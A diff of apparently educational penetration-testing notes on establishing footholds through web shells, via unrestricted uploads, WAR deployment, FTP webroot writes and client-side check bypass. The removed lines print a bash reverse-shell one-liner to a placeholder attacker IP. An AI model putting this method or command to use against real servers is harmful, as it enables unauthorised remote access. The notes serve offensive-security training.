@@ -1,43 +1,54 @@
-### Web Shell Footholds: Methodology and Implementation
+## METHODOLOGY
 
-#### Operational Overview
+1. External perimeter hardened with no exposed services (SMB). Prioritize web application attack surface.
+2. Map upload vectors: public forms, authenticated profile settings, or self-registration portals.
+3. Identify server technology: Tomcat, Axis2, and WebLogic allow deployment via WAR files.
+4. Check for misconfigured FTP services allowing direct writes to the webroot.
+5. Upload payload matching the server language (PHP, JSP, ASP.NET).
+6. Upgrade browser-based web shell to an interactive reverse shell for stability.
 
-**Web shells** serve as the primary method for establishing a **foothold** during external network assessments when perimeter services (like SMB) are hardened. They provide a browser-based interface to interact directly with the target server's underlying operating system.
+---
 
-#### Identifying Entry Points
+## FOOTHOLD VIA FILE UPLOAD
 
-Web application vulnerabilities are the most common path for gaining internal network access.
+Target lacks common vulnerable services (SMB) and requires web-based entry via unrestricted upload or misconfiguration.
 
-|Vulnerability / Misconfiguration|Context / Scenario|Attack Implication|
-|:--|:--|:--|
-|**Unrestricted File Upload**|Publicly available forms or authenticated profile sections.|Direct upload of web shell payloads (PHP, JSP, ASP.NET).|
-|**Self-Registration Bypass**|Applications allowing user sign-ups with profile picture uploads.|Bypassing **client-side checks** to upload executable code instead of images.|
-|**Application Managers**|Services like Tomcat, Axis2, or WebLogic.|Deploying JSP code via **WAR files** as a native function.|
-|**Misconfigured FTP**|FTP services with write permissions to the **webroot**.|Direct placement of a web shell into the web-accessible directory.|
-|**Web App Vulnerabilities**|SQL injection, RFI/LFI, or command injection.|Leveraging flaws to achieve remote code execution (RCE).|
+### Web Shell Deployment
 
-#### Web Shell Operational Workflow
+Uploaded payload gives remote code execution capability within the browser.
 
-Use this workflow once a file upload vulnerability or misconfiguration has been identified.
+> ⚠️ Gap: Source lacks specific web shell syntax for PHP, JSP, and ASP.NET payloads, which will result in no execution if generic files are uploaded.
 
-1. **Language Identification:** Determine the language supported by the web server (e.g., PHP, JSP, or ASP.NET).
-2. **Payload Preparation:** Craft a web shell payload written in the identified web language.
-3. **Bypass Filters:** If client-side checks are present, bypass them to ensure the payload is accepted (common in profile picture uploads).
-4. **Upload & Access:** Upload the payload to the server and navigate to the file's URL via a browser to establish a session.
-5. **Execution:** Use the browser-based interface to execute OS commands.
-6. **Upgrade:** Because web shells can be **unstable** or deleted by automated application processes, use the initial RCE to upgrade to a more interactive **reverse shell** for persistence.
+### Self-Registration and Profile Uploads
 
-#### Decision Logic: Why Use a Web Shell?
+Authenticated or self-registered sessions providing profile picture uploads can be abused to bypass client-side checks.
 
-- **When to use:** Use as an initial access vector when the perimeter is hardened against traditional service exploits.
-- **Why it matters:** It converts a web-level vulnerability into **Remote Code Execution (RCE)**, allowing interaction with the server's OS.
-- **Stability Warning:** Relying solely on a web shell is risky; some applications are configured to **automatically delete uploaded files** after a set duration. Persistence is only achieved by moving from the web shell to a reverse shell.
+> ⚠️ Gap: Source provides no methodology for bypassing client-side checks, which will cause the upload to fail against modern browsers/apps.
 
-#### Command Reference
+## JSP WAR DEPLOYMENT
 
-_Note: The current source material provides the conceptual framework for web shells; specific code syntax for different languages is introduced in subsequent sections._
+Management interfaces for specific application servers allow for JSP execution.
 
-| Action                      | Command / Placeholder                         |
-| :-------------------------- | :-------------------------------------------- |
-| **Establish Reverse Shell** | `bash -i >& /dev/tcp/<ATTACK_IP>/<PORT> 0>&1` |
-| **Access Web Shell**        | `http://<TARGET_IP>/uploads/shell.php`        |
+### WAR File Upload
+
+1. Identify Tomcat, Axis2, or WebLogic.
+2. Deploy JSP code packaged as a WAR file using native application functionality.
+
+> ⚠️ Gap: Source lacks the command-line or GUI steps to package a WAR file or interact with management interfaces, causing the technique to fail at the delivery stage.
+
+## FTP WEBROOT MISCONFIGURATION
+
+Direct operating system interaction via a web shell when file system permissions are weak.
+
+### Direct Webroot Write
+
+1. Access FTP service.
+2. Upload web shell payload directly into the server's webroot.
+
+**Application-driven file deletion** **Payloads may be deleted by the application after a specific time interval**, leading to loss of access before a reverse shell is established.
+
+## WEB SHELL INTERACTION
+
+Browser-based interaction with the underlying operating system.
+
+**Unstable session** **Relying on the web shell alone is unstable and unreliable**; persistence requires upgrading to an interactive reverse shell.
